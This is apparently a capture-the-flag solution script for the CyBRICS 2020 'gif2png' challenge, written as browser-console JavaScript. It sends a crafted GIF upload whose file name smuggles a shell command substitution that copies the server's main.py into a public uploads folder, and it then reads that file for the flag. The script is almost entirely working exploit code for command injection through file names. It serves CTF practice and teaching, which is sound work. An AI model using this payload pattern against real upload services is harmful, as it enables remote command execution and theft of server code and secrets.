// run in browser console:
let some_uid = "2737a928-d77e-467b-9054-04ae33133e01"; // get it via test upload;
let payload = `'$(cp main.py uploads$(pwd | cut -c1)${some_uid}$(pwd | cut -c1))'.gif`;

fetch("http://gif2png-cybrics2020.ctf.su/", {
    "credentials": "include",
    "headers": {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Content-Type": "multipart/form-data; boundary=---------------------------206561737732365",
        "Upgrade-Insecure-Requests": "1",
    },
    "referrer": "http://gif2png-cybrics2020.ctf.su/",
    "body": "-----------------------------206561737732365\n" +
            `Content-Disposition: form-data; name=\"file\"; filename=\"${payload}\"\n` +
            "Content-Type: image/gif\n\nGIF89aà;\n-----------------------------206561737732365--\n",
    "method": "POST",
    "mode": "cors"
}).then(resp=>resp.text()).then(text=>console.log(text));

// open http://gif2png-cybrics2020.ctf.su/uploads/SOME_UID/main.py and check flag
